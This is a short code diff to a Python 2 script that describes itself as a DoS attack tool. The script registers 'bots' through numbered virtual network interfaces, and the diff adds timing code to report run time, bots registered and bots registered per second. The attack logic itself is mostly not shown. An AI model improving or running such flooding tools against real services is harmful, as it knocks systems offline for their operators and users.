@@ -112,6 +112,8 @@ def main():
     # Initialize bot_rheader structure
     init_bot_rheader()
     
+    # Start timing
+    start = time.clock()
     count = 0
 
     print "[*] Starting DoS attack...\n"
@@ -145,6 +147,10 @@ def main():
                 cprint(str(count), "green")
 
     except Exception as e:
+        # Stop timing
+        end = time.clock()
+        run_time = end - start
+
         print "[-]", e
         if (DBG):
             cprint("\n[*] Bringing network interfaces down...", "red")
@@ -152,6 +158,10 @@ def main():
         # Bring interfaces down
         for i in range(0, count+1):
             call(["ifconfig", IFACE + ":" + str(i), "down"])
+
+        cprint("Run time: " + str(run_time), "yellow")
+        cprint("Bot registered: " + str(count), "yellow")
+        cprint("Bot registered per second: " + str(count/run_time), "yellow")
 
 
 if __name__ == "__main__":
